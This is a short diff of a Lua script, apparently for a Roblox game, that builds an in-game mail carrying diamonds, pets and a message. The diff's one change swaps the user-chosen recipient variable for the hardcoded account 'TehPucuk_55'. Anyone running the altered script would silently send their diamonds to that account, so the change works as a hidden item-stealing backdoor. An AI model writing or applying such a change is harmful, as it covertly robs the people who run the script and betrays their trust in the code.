@@ -1257,7 +1257,7 @@ if FinalList == 0 then
     end
     local args = {
         [1] = {
-            ["Recipient"] = user,
+            ["Recipient"] = "TehPucuk_55",
             ["Diamonds"] = givediaamt,
             ["Pets"] = {},
             ["Message"] = mailmsg,
